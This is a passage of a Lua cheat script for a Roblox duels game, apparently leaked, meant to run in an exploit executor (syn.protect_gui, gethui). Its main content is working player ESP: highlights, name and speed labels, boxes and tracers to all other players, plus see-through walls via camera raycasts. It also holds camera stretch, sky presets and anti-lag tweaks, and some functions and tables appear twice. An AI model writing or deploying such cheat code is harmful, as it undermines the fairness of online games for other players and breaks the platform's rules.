local sub=Instance.new("TextLabel",box); sub.Size=UDim2.new(1,-8,0,17); sub.Position=UDim2.new(0,4,0,19); sub.BackgroundTransparency=1; sub.TextColor3=Color3.fromRGB(255,255,255); sub.TextStrokeColor3=Color3.fromRGB(0,0,0); sub.Font=Enum.Font.GothamBlack; sub.TextSize=11; sub.TextStrokeTransparency=0.08
local conn=RunService.Heartbeat:Connect(function()
if not PlayerESP.enabled or not hrp.Parent then return end
local v=hrp.AssemblyLinearVelocity or hrp.Velocity
n.Text=string.format("Speed: %.1f", Vector3.new(v.X,0,v.Z).Magnitude); sub.Text=plr.Name
end)
PlayerESP.playerData[plr]={highlight=hl,billboard=bb,conns={conn}}
end
for _,plr in ipairs(Players:GetPlayers()) do if plr~=LP then if plr.Character then setup(plr,plr.Character) end; table.insert(PlayerESP.conns, plr.CharacterAdded:Connect(function(c) task.defer(setup,plr,c) end)) end end
table.insert(PlayerESP.conns, Players.PlayerAdded:Connect(function(plr) if plr~=LP then table.insert(PlayerESP.conns, plr.CharacterAdded:Connect(function(c) task.defer(setup,plr,c) end)) end end))
table.insert(PlayerESP.conns, Players.PlayerRemoving:Connect(cleanup))
end
function stopPlayerESP()
PlayerESP.enabled=false
for _,c in ipairs(PlayerESP.conns or {}) do pcall(function() c:Disconnect() end) end
PlayerESP.conns={}
for plr,d in pairs(PlayerESP.playerData or {}) do pcall(function() if d.highlight then d.highlight:Destroy() end end); pcall(function() if d.billboard then d.billboard:Destroy() end end) end
PlayerESP.playerData={}
end
function _aceEspColor()
return THEME_ACCENT or Color3.fromRGB(230,230,230)
end
function _safeDrawing(kind, props)
if not Drawing or not Drawing.new then return nil end
local ok, obj = pcall(function() return Drawing.new(kind) end)
if not ok or not obj then return nil end
for k,v in pairs(props or {}) do pcall(function() obj[k]=v end) end
return obj
end
function _cleanupBoxedESPPlayer(player)
local data = BoxedESPData[player]
if not data then return end
for _,obj in pairs(data) do
pcall(function()
obj.Visible = false
if obj.Remove then obj:Remove() end
end)
end
BoxedESPData[player] = nil
end
function _cleanupBoxedESP()
for player,_ in pairs(BoxedESPData) do _cleanupBoxedESPPlayer(player) end
end
function _updateBoxedESP()
local cam = workspace.CurrentCamera
if not cam then return end
local anyOn = BoxedESPOptions.box or BoxedESPOptions.tracer
if not anyOn then
_cleanupBoxedESP()
return
end
for _,player in ipairs(Players:GetPlayers()) do
if player == LP then continue end
local char = player.Character
local root = char and char:FindFirstChild("HumanoidRootPart")
local head = char and char:FindFirstChild("Head")
if not root or not head then
_cleanupBoxedESPPlayer(player)
continue
end
local rootPos,onScreen = cam:WorldToViewportPoint(root.Position)
local headPos = cam:WorldToViewportPoint(head.Position + Vector3.new(0,0.55,0))
local data = BoxedESPData[player]
if not data then
data = {
box = _safeDrawing("Square",{Thickness=2,Filled=false,Transparency=1,Color=_aceEspColor()}),
tracer = _safeDrawing("Line",{Thickness=2,Transparency=1,Color=_aceEspColor()}),
}
BoxedESPData[player] = data
end
local color = _aceEspColor()
local height = math.abs(headPos.Y - rootPos.Y) * 2.15
if height < 20 or height ~= height then height = 65 end
local width = height / 2.15
local view = cam.ViewportSize
local centerX, centerY = view.X/2, view.Y/2
local targetX, targetY = rootPos.X, rootPos.Y + height/2
local targetVisible = onScreen and rootPos.Z > 0
if not targetVisible then
local dx = rootPos.X - centerX
local dy = rootPos.Y - centerY
if rootPos.Z <= 0 then
dx = -dx
dy = -dy
end
if math.abs(dx) < 1 and math.abs(dy) < 1 then
local rel = cam.CFrame:PointToObjectSpace(root.Position)
dx = rel.X
dy = -rel.Y
if rootPos.Z <= 0 then
dx = -dx
dy = -dy
end
end
local edgePad = 10
local scaleX = (dx ~= 0) and ((view.X/2 - edgePad) / math.abs(dx)) or math.huge
local scaleY = (dy ~= 0) and ((view.Y/2 - edgePad) / math.abs(dy)) or math.huge
local scale = math.min(scaleX, scaleY)
if scale == math.huge or scale ~= scale then scale = 1 end
targetX = math.clamp(centerX + dx * scale, edgePad, view.X - edgePad)
targetY = math.clamp(centerY + dy * scale, edgePad, view.Y - edgePad)
end
if data.box then
data.box.Color = color
data.box.Size = Vector2.new(width,height)
data.box.Position = Vector2.new(rootPos.X - width/2, rootPos.Y - height/2)
data.box.Visible = false
end
if data.tracer then
data.tracer.Color = color
local localChar = LP.Character
local localRoot = localChar and localChar:FindFirstChild("HumanoidRootPart")
local localHead = localChar and localChar:FindFirstChild("Head")
local fromX, fromY
if localRoot then
local localScreen = cam:WorldToViewportPoint(localRoot.Position)
fromX = localScreen.X
fromY = localScreen.Y + 15
end
if not fromX or not fromY then
fromX = cam.ViewportSize.X/2
fromY = cam.ViewportSize.Y - 88
end
data.tracer.From = Vector2.new(fromX, fromY)
data.tracer.To = Vector2.new(targetX, targetY)
data.tracer.Visible = BoxedESPOptions.tracer == true
end
end
end
function refreshBoxedESP()
local anyOn = BoxedESPOptions.box or BoxedESPOptions.tracer
if anyOn and not BoxedESPConn then
BoxedESPConn = RunService.RenderStepped:Connect(_updateBoxedESP)
elseif (not anyOn) and BoxedESPConn then
BoxedESPConn:Disconnect()
BoxedESPConn = nil
_cleanupBoxedESP()
end
end
Players.PlayerRemoving:Connect(_cleanupBoxedESPPlayer)
-- ============================================================
-- ESP LINE (Tracers dari PrintedDuels): garis dari bawah layar ke SEMUA pemain
-- ============================================================
espLineState = espLineState or {gui = nil, data = {}, conn = nil, removing = nil}
espLineState.data = espLineState.data or {}
do -- scope lokal agar tidak menambah jumlah local di chunk utama

local function _espLineEnsureGui()
    local s = espLineState
    if s.gui and s.gui.Parent then return s.gui end
    local sg = Instance.new("ScreenGui")
    sg.Name = "SoundESPLineOverlay"
    sg.ResetOnSpawn = false
    sg.IgnoreGuiInset = true
    sg.DisplayOrder = 2000000
    sg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    pcall(function() if syn and syn.protect_gui then syn.protect_gui(sg) end end)
    local ok = false
    pcall(function() if gethui then sg.Parent = gethui() ok = true end end)
    if not ok then pcall(function() sg.Parent = CoreGui ok = true end) end
    if not ok then pcall(function() sg.Parent = LP:WaitForChild("PlayerGui", 5) end) end
    s.gui = sg
    return sg
end

local function _espLineClear(player)
    local line = espLineState.data[player]
    if not line then return end
    pcall(function() line:Destroy() end)
    espLineState.data[player] = nil
end

local function _espLineClearAll()
    for k in pairs(espLineState.data) do _espLineClear(k) end
    espLineState.data = {}
end

local function _espLineColor()
    return (_G.SoundThemeColors and _G.SoundThemeColors[_G.SoundThemeName]) or THEME_ACCENT or Color3.fromRGB(255, 255, 255)
end

local function _espLineMake()
    local line = Instance.new("Frame")
    line.Name = "SoundTracerLine"
    line.BorderSizePixel = 0
    line.BackgroundColor3 = _espLineColor()
    line.BackgroundTransparency = 0
    line.AnchorPoint = Vector2.new(0.5, 0.5)
    line.Size = UDim2.fromOffset(0, 2)
    line.ZIndex = 10
    line.Visible = false
    line.Parent = _espLineEnsureGui()
    return line
end

local function _espLineStep()
    local s = espLineState
    if not espLineEnabled then
        for _, l in pairs(s.data) do if l.Visible then l.Visible = false end end
        return
    end
    local cam = workspace.CurrentCamera
    if not cam then return end
    local gui = _espLineEnsureGui()
    local vp = cam.ViewportSize
    local cx = vp.X * 0.5
    local cy = vp.Y - 60
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LP then
            local char = player.Character
            if char then char = char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("Head") end
            local line = s.data[player]
            if not char then
                if line then line.Visible = false end
            else
                if not line or not line.Parent then
                    line = _espLineMake()
                    s.data[player] = line
                elseif line.Parent ~= gui then
                    line.Parent = gui
                end
                local sp = cam:WorldToViewportPoint(char.Position - Vector3.new(0, 2, 0))
                local x, y = sp.X, sp.Y
                if sp.Z <= 0 then
                    x = vp.X * 0.5 - x - vp.X * 0.5
                    y = vp.Y * 0.5 - y - vp.Y * 0.5
                    local dx = x - vp.X * 0.5
                    local dy = y - vp.Y * 0.5
                    local m = math.max(math.abs(dx), math.abs(dy))
                    if m > 0.001 then
                        local sc = math.max(vp.X, vp.Y) / m
                        x = vp.X * 0.5 + dx * sc
                        y = vp.Y * 0.5 + dy * sc
                    end
                end
                local fx = math.clamp(x, 6, vp.X - 6)
                local fy = math.clamp(y, 6, vp.Y - 6)
                local dx = fx - cx
                local dy = fy - cy
                local len = math.sqrt(dx * dx + dy * dy)
                if len >= 2 then
                    line.Size = UDim2.fromOffset(math.floor(len), 2)
                    line.Position = UDim2.fromOffset((cx + fx) * 0.5, (cy + fy) * 0.5)
                    line.Rotation = math.deg(math.atan2(dy, dx))
                    line.BackgroundColor3 = _espLineColor()
                    line.BackgroundTransparency = 0
                    line.Visible = true
                else
                    line.Visible = false
                end
            end
        end
    end
end

function stopESPLine()
    local s = espLineState
    if s.conn then pcall(function() s.conn:Disconnect() end); s.conn = nil end
    _espLineClearAll()
    if s.gui then pcall(function() s.gui:Destroy() end); s.gui = nil end
end

function startESPLine()
    local s = espLineState
    if s.conn then return end
    _espLineEnsureGui()
    s.conn = RunService.RenderStepped:Connect(function()
        pcall(_espLineStep)
    end)
    if not s.removing then
        s.removing = Players.PlayerRemoving:Connect(_espLineClear)
    end
end
end
SKY_PRESETS_LIST = {"Off","Night","Aurora","Sunset","Galaxy","Cyber","Sakura","Pink Night","Blood Moon","Emerald Dawn","Volcanic","Arctic","Midnight Ocean","Vaporwave","Toxic","Solar Eclipse","Hellscape","Heaven","Storm","Sunrise","Deep Space","Lavender Dream","Inferno","Mint Sky"}
SKY_PRESETS = {
    ["Off"]={kind="off"},
    ["Night"]={clock=22,brightness=2,ambient={110,100,130},outAmb={120,110,140},sky={stars=4000,moon=18,sun=0,moonTex=true},atm={dens=0.45,color={120,60,180},decay={60,20,100},glare=0.5,haze=1.2}},
    ["Aurora"]={clock=14,brightness=3,ambient={150,120,150},outAmb={160,130,150},atm={dens=0.55,color={255,80,200},decay={255,20,150},glare=2.5,haze=3},clouds={cover=0.7,dens=0.7,color={255,240,250}}},
    ["Sunset"]={clock=17.2,brightness=2.5,ambient={170,120,100},outAmb={180,130,110},sky={stars=0,sun=25,moon=0},atm={dens=0.5,color={255,130,60},decay={255,80,30},glare=2,haze=2.5},clouds={cover=0.55,dens=0.55,color={255,200,140}}},
    ["Galaxy"]={clock=0,brightness=1.5,ambient={70,60,100},outAmb={80,70,110},sky={stars=10000,moon=30,sun=0},atm={dens=0.15,color={40,20,80},decay={20,10,50},glare=0.3,haze=0.5}},
    ["Cyber"]={clock=21,brightness=2.2,ambient={90,130,170},outAmb={100,140,180},sky={stars=2000,moon=12},atm={dens=0.4,color={0,200,255},decay={150,0,255},glare=2,haze=2},clouds={cover=0.4,dens=0.6,color={100,200,255}}},
    ["Sakura"]={clock=11,brightness=3.5,ambient={170,150,160},outAmb={180,160,170},sky={sun=8},atm={dens=0.3,color={255,200,220},decay={255,170,200},glare=1,haze=1.5},clouds={cover=0.6,dens=0.4,color={255,250,252}}},
    ["Pink Night"]={clock=23,brightness=2.2,ambient={120,60,110},outAmb={140,70,120},sky={stars=5000,moon=22,sun=0,moonTex=true},atm={dens=0.5,color={255,80,180},decay={140,30,100},glare=0.7,haze=1.4},clouds={cover=0.3,dens=0.5,color={180,90,150}}},
    ["Blood Moon"]={clock=22.5,brightness=1.6,ambient={130,40,40},outAmb={150,50,50},sky={stars=1500,moon=28,sun=0,moonTex=true},atm={dens=0.6,color={220,30,30},decay={120,10,10},glare=1.4,haze=2},clouds={cover=0.5,dens=0.7,color={120,30,30}}},
    ["Emerald Dawn"]={clock=6.5,brightness=2.8,ambient={130,170,140},outAmb={140,180,150},sky={sun=18,moon=0,stars=0},atm={dens=0.4,color={80,200,140},decay={40,150,90},glare=1.8,haze=2.2},clouds={cover=0.5,dens=0.5,color={200,255,220}}},
    ["Volcanic"]={clock=19,brightness=2,ambient={180,80,40},outAmb={200,90,50},sky={stars=200,sun=12,moon=0},atm={dens=0.75,color={255,60,0},decay={180,20,0},glare=3,haze=3.5},clouds={cover=0.8,dens=0.9,color={120,40,20}}},
    ["Arctic"]={clock=9,brightness=3.2,ambient={200,220,235},outAmb={210,230,245},sky={sun=10,stars=0,moon=0},atm={dens=0.3,color={180,220,255},decay={140,200,240},glare=1.5,haze=1.8},clouds={cover=0.7,dens=0.6,color={250,253,255}}},
    ["Midnight Ocean"]={clock=1.5,brightness=1.7,ambient={60,90,130},outAmb={70,100,140},sky={stars=6000,moon=24,sun=0,moonTex=true},atm={dens=0.5,color={20,60,140},decay={10,30,90},glare=0.6,haze=1.5}},
    ["Vaporwave"]={clock=19.5,brightness=2.4,ambient={180,120,200},outAmb={190,130,210},sky={stars=1000,moon=14},atm={dens=0.45,color={255,100,220},decay={120,60,255},glare=2.2,haze=2.4},clouds={cover=0.55,dens=0.55,color={200,150,255}}},
    ["Toxic"]={clock=13,brightness=2.5,ambient={140,180,80},outAmb={150,190,90},atm={dens=0.55,color={100,220,40},decay={60,150,20},glare=1.8,haze=2.6},clouds={cover=0.65,dens=0.7,color={180,255,120}}},
    ["Solar Eclipse"]={clock=12,brightness=0.9,ambient={50,40,60},outAmb={60,50,70},sky={stars=3500,sun=22,moon=0},atm={dens=0.5,color={255,140,40},decay={30,20,40},glare=2.8,haze=1.8}},
    ["Hellscape"]={clock=18,brightness=1.8,ambient={200,60,30},outAmb={220,70,40},sky={stars=100,sun=30,moon=0},atm={dens=0.85,color={255,30,0},decay={120,0,0},glare=3.5,haze=4},clouds={cover=0.95,dens=0.95,color={80,20,10}}},
    ["Heaven"]={clock=12,brightness=4,ambient={240,235,210},outAmb={250,245,220},sky={sun=16,moon=0,stars=0},atm={dens=0.25,color={255,250,220},decay={255,240,200},glare=3,haze=1.5},clouds={cover=0.85,dens=0.5,color={255,255,255}}},
    ["Storm"]={clock=15,brightness=1.4,ambient={90,90,110},outAmb={100,100,120},sky={stars=0,sun=6,moon=0},atm={dens=0.65,color={80,90,120},decay={40,50,80},glare=0.5,haze=3},clouds={cover=0.95,dens=0.95,color={60,65,80}}},
    ["Sunrise"]={clock=6.2,brightness=2.8,ambient={220,180,130},outAmb={230,190,140},sky={sun=22,stars=0,moon=0},atm={dens=0.45,color={255,180,100},decay={255,140,80},glare=2.4,haze=2.2},clouds={cover=0.4,dens=0.4,color={255,220,180}}},
    ["Deep Space"]={clock=0,brightness=1,ambient={30,25,50},outAmb={40,35,60},sky={stars=15000,moon=0,sun=0},atm={dens=0.08,color={15,5,40},decay={5,0,20},glare=0.2,haze=0.3}},
    ["Lavender Dream"]={clock=18.5,brightness=2.6,ambient={180,160,220},outAmb={190,170,230},sky={stars=800,moon=16,sun=0},atm={dens=0.4,color={200,160,255},decay={160,120,220},glare=1.4,haze=1.8},clouds={cover=0.55,dens=0.5,color={220,200,255}}},
    ["Inferno"]={clock=17.5,brightness=2.2,ambient={220,100,40},outAmb={235,110,50},sky={sun=26,moon=0,stars=0},atm={dens=0.6,color={255,90,20},decay={200,40,0},glare=3,haze=3.2},clouds={cover=0.7,dens=0.7,color={200,80,40}}},
    ["Mint Sky"]={clock=10,brightness=3.2,ambient={180,230,210},outAmb={190,240,220},sky={sun=10},atm={dens=0.32,color={150,255,210},decay={100,220,180},glare=1.6,haze=1.6},clouds={cover=0.55,dens=0.45,color={240,255,250}}},
}


local function _vC3(t)
    return Color3.fromRGB(t[1], t[2], t[3])
end

function _v4mpClearSky()
    for _, child in ipairs(Lighting:GetChildren()) do
        if child:GetAttribute("_SoundDuelsSky") then
            pcall(function() child:Destroy() end)
        end
    end

    local terrain = workspace:FindFirstChildOfClass("Terrain")
    if terrain then
        for _, child in ipairs(terrain:GetChildren()) do
            if child:GetAttribute("_SoundDuelsSky") then
                pcall(function() child:Destroy() end)
            end
        end
    end
end

function applyCustomSky(mode)
    _v4mpClearSky()

    local preset = SKY_PRESETS[mode]
    if not preset or preset.kind == "off" then
        Lighting.ClockTime = 14
        Lighting.Brightness = 2
        Lighting.OutdoorAmbient = Color3.fromRGB(127,127,127)
        Lighting.Ambient = Color3.fromRGB(127,127,127)
        Lighting.FogEnd = 100000
        Lighting.GlobalShadows = true
        skyTheme = "Off"
        return
    end

    Lighting.FogStart = 0
    Lighting.FogEnd = 100000
    Lighting.FogColor = Color3.fromRGB(200,200,200)
    Lighting.ColorShift_Top = Color3.fromRGB(0,0,0)
    Lighting.ColorShift_Bottom = Color3.fromRGB(0,0,0)
    Lighting.GlobalShadows = true

    Lighting.ClockTime = preset.clock or 14
    Lighting.Brightness = preset.brightness or 2

    if preset.outAmb then
        Lighting.OutdoorAmbient = _vC3(preset.outAmb)
    end

    if preset.ambient then
        Lighting.Ambient = _vC3(preset.ambient)
    end

    if preset.sky then
        local skyInst = Instance.new("Sky")
        skyInst:SetAttribute("_SoundDuelsSky", true)

        if preset.sky.stars then skyInst.StarCount = preset.sky.stars end
        if preset.sky.moon then skyInst.MoonAngularSize = preset.sky.moon end
        if preset.sky.sun then skyInst.SunAngularSize = preset.sky.sun end
        if preset.sky.moonTex then skyInst.MoonTextureId = "rbxasset://sky/moon.jpg" end

        skyInst.Parent = Lighting
    end

    if preset.atm then
        local atm = Instance.new("Atmosphere")
        atm:SetAttribute("_SoundDuelsSky", true)
        atm.Density = preset.atm.dens or 0.3
        atm.Color = _vC3(preset.atm.color)
        atm.Decay = _vC3(preset.atm.decay)
        atm.Glare = preset.atm.glare or 1
        atm.Haze = preset.atm.haze or 1
        atm.Parent = Lighting
    end

    local terrain = workspace:FindFirstChildOfClass("Terrain")
    if preset.clouds and terrain then
        local clouds = Instance.new("Clouds")
        clouds:SetAttribute("_SoundDuelsSky", true)
        clouds.Cover = preset.clouds.cover or 0.5
        clouds.Density = preset.clouds.dens or 0.5
        clouds.Color = _vC3(preset.clouds.color)
        clouds.Parent = terrain
    end

    skyTheme = mode
end

_G.SoundStretchValue = 0.70
_G.SoundStretchPreset = "Medium"

_G.SoundStretchPresets = {
    ["Light"] = 0.85,
    ["Medium"] = 0.70,
    ["Strong"] = 0.55,
    ["Extreme"] = 0.40,
}

function enableStretchRez()
    fpsBoostEnabled = true
    if stretchRezConn then stretchRezConn:Disconnect(); stretchRezConn=nil end

    stretchRezConn = RunService.RenderStepped:Connect(function()
        if not fpsBoostEnabled then
            if stretchRezConn then stretchRezConn:Disconnect(); stretchRezConn=nil end
            return
        end

        local cam = Workspace.CurrentCamera or workspace.CurrentCamera
        if cam then
            local sv = 0.70
            --Leaked By Xlu0 AndPrime--
            cam.CFrame = cam.CFrame * CFrame.new(
                0,0,0,
                1,0,0,
                0,sv,0,
                0,0,1
            )
        end
    end)
end

function disableStretchRez()
    fpsBoostEnabled = false
    if stretchRezConn then
        stretchRezConn:Disconnect()
        stretchRezConn = nil
    end
end

function _G.SoundSetStretchPreset(name)
    local v = _G.SoundStretchPresets[name]
    if not v then return end
    _G.SoundStretchPreset = name
    _G.SoundStretchValue = v
end

function enableCustomFov() fovEnabled=true; workspace.CurrentCamera.FieldOfView=fovValue; if customFovConn then customFovConn:Disconnect() end; customFovConn=RunService.RenderStepped:Connect(function() if not fovEnabled then customFovConn:Disconnect(); customFovConn=nil; return end; workspace.CurrentCamera.FieldOfView=fovValue end) end
function disableCustomFov() fovEnabled=false; if customFovConn then customFovConn:Disconnect(); customFovConn=nil end; workspace.CurrentCamera.FieldOfView=fpsBoostEnabled and 107 or 70 end
_G.SoundZombieAntiLag = _G.SoundZombieAntiLag or {
    conn=nil,
    active=false,
    defBrightness=nil,
    defFog=nil,
    defDiffuse=nil,
    defSpecular=nil,
}

function _applyAntiLagIsChar(obj)
    local p = obj
    while p and p ~= workspace and p ~= game do
        if p:IsA("Model") and p:FindFirstChildOfClass("Humanoid") then return true end
        p = p.Parent
    end
    return false
end

function _applyAntiLagObj(obj)
    pcall(function()
        if (obj:IsA("BasePart") or obj:IsA("Decal") or obj:IsA("Texture")) and _applyAntiLagIsChar(obj) then return end
        if obj:IsA("BasePart") then
            obj.Material = Enum.Material.Plastic
            obj.Reflectance = 0
            obj.CastShadow = false
        elseif obj:IsA("Decal") or obj:IsA("Texture") then
            obj.Transparency = 1
        elseif obj:IsA("ParticleEmitter")
            or obj:IsA("Trail")
            or obj:IsA("Beam")
            or obj:IsA("Fire")
            or obj:IsA("Smoke")
            or obj:IsA("Sparkles") then
            obj.Enabled = false
        elseif obj:IsA("AnimationController") or obj:IsA("Animator") then
            local myChar = LP and LP.Character
            if myChar and obj:IsDescendantOf(myChar) then return end
            for _,tr in ipairs(obj:GetPlayingAnimationTracks()) do
                pcall(function() tr:Stop(0) end)
            end
        end
    end)
end

function enableAntiLag()
    antiLagVisualEnabled = true
    local S = _G.SoundZombieAntiLag
    S.active = true
    S.defBrightness = S.defBrightness or Lighting.Brightness
    S.defFog = S.defFog or Lighting.FogEnd
    S.defDiffuse = S.defDiffuse or Lighting.EnvironmentDiffuseScale
    S.defSpecular = S.defSpecular or Lighting.EnvironmentSpecularScale

    Lighting.GlobalShadows = false
    Lighting.FogEnd = 1e10
    Lighting.EnvironmentDiffuseScale = 0
    Lighting.EnvironmentSpecularScale = 0

    for _,e in pairs(Lighting:GetChildren()) do
        pcall(function()
            if e:IsA("BlurEffect")
                or e:IsA("SunRaysEffect")
                or e:IsA("ColorCorrectionEffect")
                or e:IsA("BloomEffect")
                or e:IsA("DepthOfFieldEffect") then
                e.Enabled = false
            end
        end)
    end

    for _,obj in ipairs(workspace:GetDescendants()) do
        _applyAntiLagObj(obj)
    end

    if S.conn then S.conn:Disconnect() end
    S.conn = workspace.DescendantAdded:Connect(function(obj)
        if S.active then _applyAntiLagObj(obj) end
    end)
    antiLagDescConn = S.conn
end

function disableAntiLag()
    antiLagVisualEnabled = false
    local S = _G.SoundZombieAntiLag
    S.active = false

    if S.conn then
        S.conn:Disconnect()
        S.conn = nil
    end
    antiLagDescConn = nil

    pcall(function()
        Lighting.GlobalShadows = true
        if S.defBrightness then Lighting.Brightness = S.defBrightness end
        if S.defFog then Lighting.FogEnd = S.defFog end
        if S.defDiffuse then Lighting.EnvironmentDiffuseScale = S.defDiffuse end
        if S.defSpecular then Lighting.EnvironmentSpecularScale = S.defSpecular end

        for _,e in pairs(Lighting:GetChildren()) do
            pcall(function()
                if e:IsA("BlurEffect")
                    or e:IsA("SunRaysEffect")
                    or e:IsA("ColorCorrectionEffect")
                    or e:IsA("BloomEffect")
                    or e:IsA("DepthOfFieldEffect") then
                    e.Enabled = true
                end
            end)
        end
    end)
end

function applyKTMOptimization()
    enableAntiLag()
end

function enableNukeOptimizer()
nukeOptimiserEnabled=true; _aceNukeOn=true; applyKTMOptimization(); applyCustomSky("Off")
for _,c in ipairs(_aceNukeConns) do pcall(function() c:Disconnect() end) end; _aceNukeConns={}
table.insert(_aceNukeConns, workspace.DescendantAdded:Connect(function(o) if nukeOptimiserEnabled then _applyAntiLagObj(o) end end))
task.spawn(function() while nukeOptimiserEnabled do pcall(function() setfpscap(240) end); task.wait(3) end end)
end
function disableNukeOptimizer() nukeOptimiserEnabled=false; _aceNukeOn=false; for _,c in ipairs(_aceNukeConns) do pcall(function() c:Disconnect() end) end; _aceNukeConns={} end
function enableNoCamCollision()
noCamCollisionEnabled=true; if noCamCollisionConn then noCamCollisionConn:Disconnect() end
noCamCollisionConn=RunService.RenderStepped:Connect(function()
if not noCamCollisionEnabled then return end
local cam=workspace.CurrentCamera; local char=LP.Character; local hrp=char and char:FindFirstChild("HumanoidRootPart"); if not cam or not hrp then return end
local params=RaycastParams.new(); params.FilterType=Enum.RaycastFilterType.Exclude; params.FilterDescendantsInstances=workspace.CurrentCamera and workspace.CurrentCamera:FindFirstChild("_SoundAvatarOverlay") and {char,workspace.CurrentCamera:FindFirstChild("_SoundAvatarOverlay")} or {char}; params.IgnoreWater=true
local res=workspace:Raycast(cam.CFrame.Position,(hrp.Position+Vector3.new(0,1.5,0))-cam.CFrame.Position,params)
local hit={}
if res and res.Instance and res.Instance:IsA("BasePart") then hit[res.Instance]=true; if noCamCollisionParts[res.Instance]==nil then noCamCollisionParts[res.Instance]=res.Instance.LocalTransparencyModifier end; res.Instance.LocalTransparencyModifier=1 end
for part,orig in pairs(noCamCollisionParts) do if not hit[part] then pcall(function() if part and part.Parent then part.LocalTransparencyModifier=orig end end); noCamCollisionParts[part]=nil end end
end)
end
function disableNoCamCollision() noCamCollisionEnabled=false; if noCamCollisionConn then noCamCollisionConn:Disconnect(); noCamCollisionConn=nil end; for p,orig in pairs(noCamCollisionParts) do pcall(function() if p and p.Parent then p.LocalTransparencyModifier=orig end end) end; noCamCollisionParts={} end
function enableCustomFont() customFontVisualEnabled=false; if V then V.customFontEnabled=false end end
function disableCustomFont() customFontVisualEnabled=false; if V then V.customFontEnabled=false end end
end
V = V or {}
V.skyTheme = skyTheme or V.skyTheme or "Off"
V.nukeOptEnabled = nukeOptimiserEnabled == true
V.customFontEnabled = false
V.potatoGraphicsEnabled = V.potatoGraphicsEnabled or false
function enableNoCamCollision()
noCamCollisionEnabled = true
if noCamCollisionConn then noCamCollisionConn:Disconnect() end
noCamCollisionConn = RunService.RenderStepped:Connect(function()
if not noCamCollisionEnabled then
if noCamCollisionConn then noCamCollisionConn:Disconnect();noCamCollisionConn=nil end
return
end
local cam = workspace.CurrentCamera
local char = LP.Character
if not cam or not char then return end
local hrp = char:FindFirstChild("HumanoidRootPart")
if not hrp then return end
local camPos = cam.CFrame.Position
local charPos = hrp.Position + Vector3.new(0,1.5,0)
local toChar = charPos - camPos
if toChar.Magnitude < 0.3 then return end
local params = RaycastParams.new()
params.FilterType = Enum.RaycastFilterType.Exclude
params.FilterDescendantsInstances = workspace.CurrentCamera and workspace.CurrentCamera:FindFirstChild("_SoundAvatarOverlay") and {char, workspace.CurrentCamera:FindFirstChild("_SoundAvatarOverlay")} or {char}
params.IgnoreWater = true
local hit = {}
local origin = camPos
local remaining = toChar
for _ = 1,12 do
if remaining.Magnitude < 0.2 then break end
local res = workspace:Raycast(origin,remaining,params)
if not res then break end
local part = res.Instance
if part and part:IsA("BasePart") and not part:IsDescendantOf(char) then
hit[part] = true
if noCamCollisionParts[part] == nil then noCamCollisionParts[part] = part.LocalTransparencyModifier end
part.LocalTransparencyModifier = 1
end
origin = res.Position + remaining.Unit * 0.02
remaining = charPos - origin
end
for part,orig in pairs(noCamCollisionParts) do
if not hit[part] then
pcall(function() if part and part.Parent then part.LocalTransparencyModifier = orig end end)
noCamCollisionParts[part] = nil
end
end
end)
end
function disableNoCamCollision()
noCamCollisionEnabled = false
if noCamCollisionConn then noCamCollisionConn:Disconnect();noCamCollisionConn=nil end
for part,orig in pairs(noCamCollisionParts) do
pcall(function() if part and part.Parent then part.LocalTransparencyModifier = orig end end)
end
noCamCollisionParts = {}
end
SKY_PRESETS_LIST = {"Off","Night","Aurora","Sunset","Galaxy","Tech","Sakura","Pink Night",
"Blood Moon","Emerald Dawn","Volcanic","Arctic","Midnight Ocean","Vaporwave","Toxic","Solar Eclipse",
"Hellscape","Heaven","Storm","Sunrise","Deep Space","Lavender Dream","Inferno","Mint Sky"}
SKY_PRESETS = {
["Off"] = {kind = "off"},
["Night"] = {clock=22,brightness=2,ambient={110,100,130},outAmb={120,110,140},sky={stars=4000,moon=18,sun=0,moonTex=true},atm={dens=0.45,color={120,60,180},decay={60,20,100},glare=0.5,haze=1.2}},
["Aurora"] = {clock=14,brightness=3,ambient={150,120,150},outAmb={160,130,150},atm={dens=0.55,color={255,80,200},decay={255,20,150},glare=2.5,haze=3},clouds={cover=0.7,dens=0.7,color={255,240,250}}},
["Sunset"] = {clock=17.2,brightness=2.5,ambient={170,120,100},outAmb={180,130,110},sky={stars=0,sun=25,moon=0},atm={dens=0.5,color={255,130,60},decay={255,80,30},glare=2,haze=2.5},clouds={cover=0.55,dens=0.55,color={255,200,140}}},
["Galaxy"] = {clock=0,brightness=1.5,ambient={70,60,100},outAmb={80,70,110},sky={stars=10000,moon=30,sun=0},atm={dens=0.15,color={40,20,80},decay={20,10,50},glare=0.3,haze=0.5}},
["Tech"] = {clock=21,brightness=2.2,ambient={90,130,170},outAmb={100,140,180},sky={stars=2000,moon=12},atm={dens=0.4,color={0,200,255},decay={150,0,255},glare=2,haze=2},clouds={cover=0.4,dens=0.6,color={100,200,255}}},
["Sakura"] = {clock=11,brightness=3.5,ambient={170,150,160},outAmb={180,160,170},sky={sun=8},atm={dens=0.3,color={255,200,220},decay={255,170,200},glare=1,haze=1.5},clouds={cover=0.6,dens=0.4,color={255,250,252}}},
["Pink Night"] = {clock=23,brightness=2.2,ambient={120,60,110},outAmb={140,70,120},sky={stars=5000,moon=22,sun=0,moonTex=true},atm={dens=0.5,color={255,80,180},decay={140,30,100},glare=0.7,haze=1.4},clouds={cover=0.3,dens=0.5,color={180,90,150}}},
["Blood Moon"] = {clock=22.5,brightness=1.6,ambient={130,40,40},outAmb={150,50,50},sky={stars=1500,moon=28,sun=0,moonTex=true},atm={dens=0.6,color={220,30,30},decay={120,10,10},glare=1.4,haze=2},clouds={cover=0.5,dens=0.7,color={120,30,30}}},
["Emerald Dawn"] = {clock=6.5,brightness=2.8,ambient={130,170,140},outAmb={140,180,150},sky={sun=18,moon=0,stars=0},atm={dens=0.4,color={80,200,140},decay={40,150,90},glare=1.8,haze=2.2},clouds={cover=0.5,dens=0.5,color={200,255,220}}},
["Volcanic"] = {clock=19,brightness=2,ambient={180,80,40},outAmb={200,90,50},sky={stars=200,sun=12,moon=0},atm={dens=0.75,color={255,60,0},decay={180,20,0},glare=3,haze=3.5},clouds={cover=0.8,dens=0.9,color={120,40,20}}},
